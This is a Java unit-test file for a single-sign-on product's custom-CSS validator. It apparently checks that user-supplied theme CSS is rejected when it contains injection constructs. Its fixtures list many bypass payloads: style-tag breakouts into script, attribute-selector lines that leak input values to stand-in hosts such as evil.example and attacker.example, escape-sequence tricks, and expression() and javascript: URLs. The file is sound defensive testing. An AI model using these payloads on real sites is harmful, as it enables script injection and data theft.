/*
 * Copyright 2026 HelixIAM contributors
 * SPDX-License-Identifier: Apache-2.0
 */

package io.helixiam.authorization.theme;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;
import java.util.Set;
import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.params.provider.Arguments.arguments;

/**
 * Spec §4: the custom-CSS escape hatch accepts plain CSS only, checked strictly on the raw input, and names the
 * offending construct. Includes every bypass payload from the Task 1 review (C1 a–f, C2).
 */
class CustomCssValidatorTest {

    private static final Set<String> OPERATOR_ORIGINS = Set.of("https://allowed.example");

    private static java.util.Optional<String> check(final String css) {
        return CustomCssValidator.validate(css, "firm", OPERATOR_ORIGINS);
    }

    @Test
    void plainCss_isAccepted() {
        assertThat(check(".helix-form h1 { letter-spacing: -0.01em; color: #16211f; }\n"
                + "@media (max-width: 600px) { .x { padding: 0 } }\r\n"
                + "\t.a::before { content: \"Hello, world\"; }\f"
                + ".b { background: url(/realms/firm/theme/assets/a1b2c3.png) no-repeat }\n"
                + ".c { background-image: url( 'https://allowed.example/hero.webp' ) }\n"
                + ".d { background-image: URL(\"https://allowed.example/x.png\") }")).isEmpty();
        assertThat(check(null)).isEmpty();
        assertThat(check("")).isEmpty();
    }

    static Stream<org.junit.jupiter.params.provider.Arguments> payloads() {
        return Stream.of(
                // Review C1 (a)-(f), reproduced bypasses of the old normaliser.
                arguments("/* </style><script>alert(1)</script> */", "<"),
                arguments("/* </style><script>alert(1)</script> */", "comment"),
                arguments("a{content:\"/*\"}</style><script>alert(1)</script><style>a{content:\"*/\"}", "<"),
                arguments("a{content:\"/*\"} input[value^=a]{background:url(https://evil.example/a)} b{content:\"*/\"}",
                        "comment"),
                arguments("a{content:\"/*\"} input[value^=a]{background:url(https://evil.example/a)} b{content:\"*/\"}",
                        "url("),
                arguments("input{background:\\75\r\nrl(https://evil.example/a)}", "backslash"),
                arguments("a{background:url(https://allowed.example\\)@evil.example/a)}", "backslash"),
                arguments("a{background:url(\"https://allowed.example\\\"@evil.example/a\")}", "backslash"),
                arguments("a{background:url(\"https://allowed.example\\22 @evil.example/a\")}", "backslash"),
                // Review C2: an origin the admin controls (e.g. their own logo host) is not on the operator list.
                arguments("input[value^=a]{background:url(https://attacker.example/a)}", "url("),
                // Plain forbidden constructs.
                arguments("</style><script>alert(1)</script>", "<"),
                arguments("@import url(https://allowed.example/x.css);", "@import"),
                arguments("@IMPORT 'x.css';", "@import"),
                arguments("@charset \"utf-8\";", "@charset"),
                arguments("@namespace svg url(https://allowed.example/svg);", "@namespace"),
                arguments(".a { width: expression(alert(1)) }", "expression("),
                arguments(".a { width: EXPRESSION (alert(1)) }", "expression("),
                arguments(".a { behavior: url(x.htc) }", "behavior:"),
                arguments(".a { -moz-binding: url(x.xml#xss) }", "-moz-binding"),
                arguments(".a { background: url(javascript:alert(1)) }", "javascript:"),
                arguments(".a { background: url(//evil.example/a.png) }", "url("),
                arguments(".a { background: url(data:image/png;base64,AAAA) }", "url("),
                arguments(".a { background: url(/realms/other/theme/assets/logo.png) }", "url("),
                arguments(".a { background: url(/realms/firm/theme/assets/../../x.png) }", "url("),
                arguments(".a { background: url(https://allowed.example.evil.example/x.png) }", "url("),
                arguments(".a { background: url(https://allowed.example@evil.example/x.png) }", "url("),
                arguments(".a { background: url(http://allowed.example/x.png) }", "url("),
                arguments(".a { background: url(https://allowed.example/a b.png) }", "url("),
                arguments(".a { background: url(\"https://allowed.example/a\" \"https://evil.example/b\") }", "url("),
                arguments(".a { background: url(\"https://allowed.example/a", "url("),
                arguments(".a { background: image-set('https://evil.example/a.png' 1x) }", "image-set("),
                arguments(".a { background: -webkit-image-set('https://evil.example/a.png' 1x) }", "image-set("),
                arguments(".a { background: src(https://evil.example/a.png) }", "src("),
                arguments(".a { background: image('https://evil.example/a.png') }", "image("),
                arguments(".a { background: cross-fade(url(/realms/firm/theme/assets/a.png), 'https://evil.example/b.png') }",
                        "cross-fade("),
                arguments(".a { color: red }\u0000</style>", "control character"),
                arguments(".a { color: red }\u0000", "control character"),
                arguments(".a { color: red }\u000b", "control character"));
    }

    @ParameterizedTest(name = "[{index}] names {1}")
    @MethodSource("payloads")
    void attackPayloads_areRejected_namingTheConstruct(final String css, final String construct) {
        assertThat(CustomCssValidator.problems(css, "firm", OPERATOR_ORIGINS)).as(css)
                .anySatisfy(m -> assertThat(m).containsIgnoringCase(construct));
    }

    @ParameterizedTest
    @ValueSource(strings = {
            ".a { background: url(/realms/firm/theme/assets/a1b2c3.png) }",
            ".a { background: url('/realms/firm/theme/assets/a1b2c3.svg') }",
            ".a { background: url( \"https://allowed.example/hero.webp\" ) }",
            ".a { background: url(https://allowed.example:443/hero.webp) }"})
    void ownAssetsAndOperatorAllowlistedOrigins_areAccepted(final String css) {
        assertThat(check(css)).as(css).isEmpty();
    }

    @Test
    void withNoOperatorAllowlist_onlyOwnAssetsMayBeFetched() {
        assertThat(CustomCssValidator.validate(".a{background:url(https://allowed.example/x.png)}", "firm", Set.of()))
                .isPresent();
        assertThat(CustomCssValidator.validate(".a{background:url(/realms/firm/theme/assets/x1.png)}", "firm", Set.of()))
                .isEmpty();
    }

    @Test
    void ownAssetUrls_canBeCheckedAgainstTheCatalog() {
        assertThat(CustomCssValidator.problems(".a{background:url(/realms/firm/theme/assets/logo01.svg)}", "firm", Set.of(),
                ThemeFixtures.monthfoldCatalog())).isEmpty();
        assertThat(CustomCssValidator.problems(".a{background:url(/realms/firm/theme/assets/missing.svg)}", "firm", Set.of(),
                ThemeFixtures.monthfoldCatalog())).isNotEmpty();
    }

    @Test
    void over32KiB_isRejected() {
        final String css = ".a{}".repeat(CustomCssValidator.MAX_BYTES / 4 + 1);
        assertThat(check(css)).hasValueSatisfying(m -> assertThat(m).contains("32 KB"));
        assertThat(check(".a{}".repeat(CustomCssValidator.MAX_BYTES / 4))).isEmpty();
    }

    @Test
    void everyViolationIsReported() {
        assertThat(CustomCssValidator.problems("@import 'a'; .b { behavior: x }", "firm", List.of())).hasSize(2);
    }
}
